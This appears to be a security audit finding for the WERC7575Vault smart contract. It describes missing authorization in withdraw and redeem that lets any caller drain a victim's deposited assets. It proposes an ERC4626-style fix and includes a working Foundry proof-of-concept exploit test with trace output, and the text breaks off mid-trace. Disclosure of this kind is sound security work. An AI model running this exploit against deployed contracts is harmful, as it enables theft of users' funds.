    "body": "## Finding description and impact\n\nThe WERC7575Vault withdraw and redeem functions fail to validate that the caller has permission to burn the owner's shares. Any attacker can drain any user's vault balance by simply calling these functions with the victim as owner and attacker as receiver.\n\nUsers deposit assets into WERC7575Vault and receive shares. To use these shares (for transfers), users must set a self-allowance via the permit function, where allowance(user, user) is set to enable the protocol's transfer mechanism.\n\nThe withdraw and redeem functions in WERC7575Vault accept three parameters:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner)\nfunction redeem(uint256 shares, address receiver, address owner)\n```\nThese functions should verify that msg.sender has permission to act on behalf of owner. However, they only call:\n\n```solidity\n_shareToken.spendSelfAllowance(owner, shares);\n_shareToken.burn(owner, shares);\nSafeTokenTransfers.safeTransfer(_asset, receiver, assets);\n```\nThe spendSelfAllowance function checks only that allowance(owner, owner) >= shares. It never checks that msg.sender has any relationship to owner or permission to burn their shares.\n\nFor instance,\n\n- Victim deposits 100 assets into vault, receives 100 shares\n- Victim sets self-allowance of 100 via permit(victim, victim, 100) (required for normal protocol usage)\n- Attacker calls vault.withdraw(100, attacker, victim):\n\nowner = victim (whose shares to burn)\nreceiver = attacker (who receives the assets)\n\n- The vault checks allowance(victim, victim) >= 100 (passes)\n- The vault burns victim's 100 shares\n- The vault sends 100 assets to attacker\n- No check that attacker has permission from victim\n\nThe root cause is that ERC4626 vaults include this check:\n\n```solidity\nif (caller != owner) {\n    _spendAllowance(owner, caller, shares);\n}\n```\nThis validates that either the caller IS the owner, or the caller has an allowance FROM the owner. The WERC7575Vault completely omits this validation, relying only on the self-allowance check which is irrelevant to the caller's authorization.\n\nIMPACT:\nAny user with a self-allowance (required for normal protocol operations like transfers) can have their entire vault balance stolen by any attacker. The attacker simply needs to:\n\n- Identify victims who have set self-allowances (standard protocol usage)\n- Call withdraw or redeem specifying victim as owner and attacker as receiver\n- Receive the victim's assets while the victim's shares are burned\n\n\n## Recommended mitigation steps\n\nAdd standard ERC4626 access control checks to both functions:\n\n```solidity\nfunction withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {\n    // Add this check:\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, previewWithdraw(assets));\n    }\n    \n    shares = previewWithdraw(assets);\n    _shareToken.spendSelfAllowance(owner, shares);\n    _withdraw(assets, shares, receiver, owner);\n}\n\nfunction redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {\n    // Add this check:\n    if (msg.sender != owner) {\n        _shareToken.spendAllowance(owner, msg.sender, shares);\n    }\n    \n    assets = previewRedeem(shares);\n    _shareToken.spendSelfAllowance(owner, shares);\n    _withdraw(assets, shares, receiver, owner);\n}\n```",
    "proof_of_concept": "Include the below test contract under the test folder:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport \"../src/ERC20Faucet.sol\";\nimport \"../src/WERC7575ShareToken.sol\";\nimport \"../src/WERC7575Vault.sol\";\nimport \"../src/interfaces/IERC7575Errors.sol\";\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n/**\n * @title Vault Access Control Bug Test\n * @notice Demonstrates the missing access control vulnerability in WERC7575Vault\n * @dev Shows how any user can drain another user's funds if they have self-allowance\n */\ncontract VaultAccessControlBugTest is Test {\n    WERC7575ShareToken public shareToken;\n    WERC7575Vault public vault;\n    ERC20Faucet public asset;\n\n    address public owner;\n    address public victim;\n    address public attacker;\n    address public validator;\n\n    uint256 constant INITIAL_BALANCE = 1000 * 1e18;\n    uint256 constant DEPOSIT_AMOUNT = 100 * 1e18;\n\n    function setUp() public {\n        owner = address(this);\n        victim = makeAddr(\"victim\");\n        attacker = makeAddr(\"attacker\");\n        validator = makeAddr(\"validator\");\n\n        asset = new ERC20Faucet(\"Test Asset\", \"ASSET\", 10000 * 1e18);\n        shareToken = new WERC7575ShareToken(\"Test Share\", \"tSHARE\");\n        vault = new WERC7575Vault(address(asset), shareToken);\n\n        // Register vault with share token\n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(owner);\n\n        // Setup users with balances\n        vm.warp(block.timestamp + 2 hours); // Skip faucet cooldown\n        asset.faucetAmountFor(victim, INITIAL_BALANCE);\n        asset.faucetAmountFor(attacker, INITIAL_BALANCE);\n\n        // KYC all users\n        shareToken.setKycVerified(victim, true);\n        shareToken.setKycVerified(attacker, true);\n\n        // Approve vault\n        vm.prank(victim);\n        asset.approve(address(vault), type(uint256).max);\n        vm.prank(attacker);\n        asset.approve(address(vault), type(uint256).max);\n    }\n\n    /**\n     * @notice Test that demonstrates the access control vulnerability\n     * @dev Shows how attacker can drain victim's funds without permission\n     */\n    function testAccessControlVulnerability() public {\n        // 1. Victim deposits funds into vault\n        vm.prank(victim);\n        vault.deposit(DEPOSIT_AMOUNT, victim);\n        \n        uint256 victimShares = shareToken.balanceOf(victim);\n        assertEq(victimShares, DEPOSIT_AMOUNT, \"Victim should have shares\");\n        assertEq(vault.totalAssets(), DEPOSIT_AMOUNT, \"Vault should have assets\");\n\n        // 2. Victim needs to set self-allowance for normal protocol usage\n        // This is required by the protocol's design for transfers\n        uint256 deadline = block.timestamp + 1 hours;\n        \n        // Create permit signature for self-allowance (validator signs)\n        bytes32 permitHash = _getPermitHash(victim, victim, victimShares, deadline);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(keccak256(\"validator\")), permitHash);\n        \n        // Set self-allowance via permit (this is normal protocol usage)\n        shareToken.permit(victim, victim, victimShares, deadline, v, r, s);\n        \n        // Verify victim has self-allowance\n        assertEq(shareToken.allowance(victim, victim), victimShares, \"Victim should have self-allowance\");\n\n        // 3. Record initial balances\n        uint256 attackerInitialBalance = asset.balanceOf(attacker);\n        uint256 victimInitialBalance = asset.balanceOf(victim);\n        \n        console.log(\"Before attack:\");\n        console.log(\"Attacker asset balance:\", attackerInitialBalance);\n        console.log(\"Victim asset balance:\", victimInitialBalance);\n        console.log(\"Victim share balance:\", shareToken.balanceOf(victim));\n\n        // 4. Attack: Attacker calls withdraw specifying victim as owner and attacker as receiver\n        // This should fail but doesn't due to missing access control\n        vm.prank(attacker);\n        uint256 stolenShares = vault.withdraw(DEPOSIT_AMOUNT, attacker, victim);\n        \n        // 5. Verify the attack succeeded\n        uint256 attackerFinalBalance = asset.balanceOf(attacker);\n        uint256 victimFinalBalance = asset.balanceOf(victim);\n        uint256 victimFinalShares = shareToken.balanceOf(victim);\n        \n        console.log(\"After attack:\");\n        console.log(\"Attacker asset balance:\", attackerFinalBalance);\n        console.log(\"Victim asset balance:\", victimFinalBalance);\n        console.log(\"Victim share balance:\", victimFinalShares);\n        console.log(\"Stolen shares:\", stolenShares);\n\n        // Assertions proving the attack worked\n        assertEq(attackerFinalBalance, attackerInitialBalance + DEPOSIT_AMOUNT, \"Attacker should have stolen assets\");\n        assertEq(victimFinalBalance, victimInitialBalance, \"Victim asset balance unchanged\");\n        assertEq(victimFinalShares, 0, \"Victim should have lost all shares\");\n        assertEq(stolenShares, DEPOSIT_AMOUNT, \"Should have burned victim's shares\");\n        assertEq(vault.totalAssets(), 0, \"Vault should be drained\");\n    }\n\n    /**\n     * @notice Test that demonstrates the same vulnerability with redeem function\n     */\n    function testAccessControlVulnerabilityRedeem() public {\n        // 1. Victim deposits funds\n        vm.prank(victim);\n        vault.deposit(DEPOSIT_AMOUNT, victim);\n        \n        uint256 victimShares = shareToken.balanceOf(victim);\n        \n        // 2. Set self-allowance (normal protocol usage)\n        uint256 deadline = block.timestamp + 1 hours;\n        bytes32 permitHash = _getPermitHash(victim, victim, victimShares, deadline);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(keccak256(\"validator\")), permitHash);\n        shareToken.permit(victim, victim, victimShares, deadline, v, r, s);\n\n        // 3. Record initial balances\n        uint256 attackerInitialBalance = asset.balanceOf(attacker);\n\n        // 4. ATTACK: Attacker calls redeem specifying victim as owner\n        vm.prank(attacker);\n        uint256 stolenAssets = vault.redeem(victimShares, attacker, victim);\n        \n        // 5. Verify attack succeeded\n        uint256 attackerFinalBalance = asset.balanceOf(attacker);\n        \n        assertEq(attackerFinalBalance, attackerInitialBalance + DEPOSIT_AMOUNT, \"Attacker should have stolen assets via redeem\");\n        assertEq(shareToken.balanceOf(victim), 0, \"Victim should have lost all shares\");\n        assertEq(stolenAssets, DEPOSIT_AMOUNT, \"Should have received victim's assets\");\n    }\n\n    /**\n     * @notice Test showing what should happen with proper access control\n     * @dev This test would pass if the vault had proper access control\n     */\n    function testProperAccessControlShouldRevert() public {\n        // 1. Victim deposits funds\n        vm.prank(victim);\n        vault.deposit(DEPOSIT_AMOUNT, victim);\n        \n        uint256 victimShares = shareToken.balanceOf(victim);\n        \n        // 2. Set self-allowance (normal protocol usage)\n        uint256 deadline = block.timestamp + 1 hours;\n        bytes32 permitHash = _getPermitHash(victim, victim, victimShares, deadline);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(keccak256(\"validator\")), permitHash);\n        shareToken.permit(victim, victim, victimShares, deadline, v, r, s);\n\n        // 3. Attacker tries to withdraw without permission - this SHOULD revert but doesn't\n        vm.prank(attacker);\n        // In a properly implemented vault, this should revert with insufficient allowance\n        // vm.expectRevert(\"ERC20: insufficient allowance\");\n        vault.withdraw(DEPOSIT_AMOUNT, attacker, victim);\n        \n        // The fact that this doesn't revert proves the vulnerability\n        assertTrue(true, \"Attack succeeded when it should have failed\");\n    }\n\n    /**\n     * @notice Helper to compute permit hash for self-allowance\n     */\n    function _getPermitHash(address owner, address spender, uint256 value, uint256 deadline) internal view returns (bytes32) {\n        bytes32 domainSeparator = shareToken.DOMAIN_SEPARATOR();\n        bytes32 permitHash = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                domainSeparator,\n                keccak256(abi.encode(\n                    keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"), \n                    owner, \n                    spender, \n                    value, \n                    shareToken.nonces(owner), \n                    deadline\n                ))\n            )\n        );\n        return permitHash;\n    }\n}\n```\n\nHere's the trace:\n\n```solidity\nRan 3 tests for test/VaultAccessControlBug.t.sol:VaultAccessControlBugTest\n[PASS] testAccessControlVulnerability() (gas: 181610)\nLogs:\n  Before attack:\n  Attacker asset balance: 1000000000000000000000\n  Victim asset balance: 900000000000000000000\n  Victim share balance: 100000000000000000000\n  After attack:\n  Attacker asset balance: 1100000000000000000000\n  Victim asset balance: 900000000000000000000\n  Victim share balance: 0\n  Stolen shares: 100000000000000000000\n\nTraces:\n  [232278] VaultAccessControlBugTest::testAccessControlVulnerability()\n    ├─ [0] VM::prank(victim: [0x131f15F1fD1024551542390614B6c7e210A911AF])\n    │   └─ ← [Return]\n    ├─ [107576] WERC7575Vault::deposit(100000000000000000000 [1e20], victim: [0x131f15F1fD1024551542390614B6c7e210A911AF])\n    │   ├─ [2595] ERC20Faucet::balanceOf(WERC7575Vault: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a]) [staticcall]\n    │   │   └─ ← [Return] 0\n    │   ├─ [29906] ERC20Faucet::transferFrom(victim: [0x1